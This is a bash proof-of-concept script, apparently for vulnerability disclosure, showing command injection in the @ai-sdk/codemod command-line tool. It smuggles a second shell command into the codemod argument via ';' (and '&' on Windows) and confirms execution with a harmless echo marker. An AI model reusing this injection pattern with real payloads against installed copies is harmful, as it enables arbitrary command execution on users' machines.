#!/bin/bash
# RCE PoC: @ai-sdk/codemod command injection
#
# Run from repo root after: pnpm install (in packages/codemod)
#
# Unix/Linux/macOS - semicolon injection via codemod argument:
#   ./poc.sh
#
# Or run manually:
#   cd packages/codemod && npx tsx src/bin/codemod.ts "v4/remove-ai; echo RCE_SUCCESS" .

set -e
cd "$(dirname "$0")/../../packages/codemod"

echo "[*] PoC: Command injection via codemod argument"
echo "[*] Running: codemod 'v4/remove-ai; echo RCE_SUCCESS' ."
echo ""

npx tsx src/bin/codemod.ts "v4/remove-ai; echo RCE_SUCCESS" . 2>&1 | tee /tmp/codemod-poc.out

if grep -q "RCE_SUCCESS" /tmp/codemod-poc.out; then
  echo ""
  echo ">>> RCE CONFIRMED: Injected command executed (RCE_SUCCESS found in output)"
else
  echo ""
  echo "[*] Check output above - codemod may have failed before/after injection."
  echo "[*] On Windows use: npx tsx src/bin/codemod.ts \"v4/remove-ai&echo RCE_SUCCESS\" ."
fi
